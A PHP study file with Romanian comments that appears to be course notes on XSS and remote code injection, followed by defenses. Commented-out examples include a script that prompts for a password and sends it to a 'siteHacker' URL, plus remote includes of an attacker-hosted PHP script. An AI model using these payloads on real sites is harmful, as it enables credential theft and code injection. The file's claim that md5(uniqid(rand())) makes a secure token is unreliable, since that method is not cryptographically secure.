<?php
/* 
    Cross Site Scripting (pe scurt XSite scripting sau XSS) este un sistem
    care determină emiterea unui script nedorit, definit de client.
*/
?>

<!-- .............. 1 ............ -->
<!-- Primul script malitios -->
<!-- 
    <script>
        raspuns = window.prompt("Introduceti va rog parola", ""); 
        document.location = "siteHacker?parola=" + raspuns;
    </script> 
-->

<!-- .............. 2 ............ -->
<!-- Al 2-lea script malitios inclus intr-un input-->
<!-- 
    <script language="php">
        include "http://www.sitehacker.com/scriptHacker.php";
    </script> 
-->

<?php
// .............. 3 ............
/*
    Uneori obținerea unei pagini de pe site este făcută prin intermediul
    unei părți care se comportă ca un furnizor de pagini, pe baza parametrului:
*/
    // $pagina = $_GET['pagina'];
    // include $pagina; 
/*
    Daca introducem acest lucru in URL, va include pagina respectiva
    o va recunoaste: 'numePagina.php?pagina=paginaMea.html'
*/
/*
    In acest caz hacker-ul poate schimba foarte usor calea:
    'numePagina.php?pagina=http://www.siteHacker.com/paginaHacker.php'

    Acest concept s enumeste 'Remote Code Injection'
*/

// .............. 4 ............
/*
    Măsuri de securitate pentru XSite Scripting sunt cele standard, care au
    fost menționate deja: filtrarea ieșirilor și a intrărilor de pe client și
    server, însă acestea se aplică cu ajutorul unor clase și funcții manuale
    sau integrate.

    Dezactivarea scriptului de server de pe un calculator remote, se poate rezolva 
    prin dezactivarea opțiunii allow_url_fopen din fișierul php.ini:

    ; Whether to allow the treatment of URLs (like http://
    or ftp://) as files.
    allow_url_fopen = Off

    După modificările efectuate în php.ini, scriptul remote poate fi activat astfel:

    include "http://www.hackerSite.com/scriptHacker.php";
*/
/*
    O modalitate sigură de creare a unui token sigur este prin intermediul
    funcției uniqid(). Aceasta crează un ID unic, bazat pe timpul curent.
    Generarea unui token in timp real, aplicatie
*/

    // echo uniqid(rand());

// Sau mult mai sigur pentru generarea unui token

    // echo md5(uniqid(rand(), true));
?>

<?php
    // session_start();
    // $token = md5(uniqid(rand(), true));
    // $_SESSION['token'] = $token;

    // if (isset($_SESSION['token']) && isset($_POST['token']) && $_POST['token'] == $_SESSION['token']){
    //     // Daca token este ok, pagina este executata
    // }
?>
    <!-- <form action="crossSiteScripting.php" method="POST">
        <input type="hidden" name="token" value="<?php echo $token; ?>" />
    </form> -->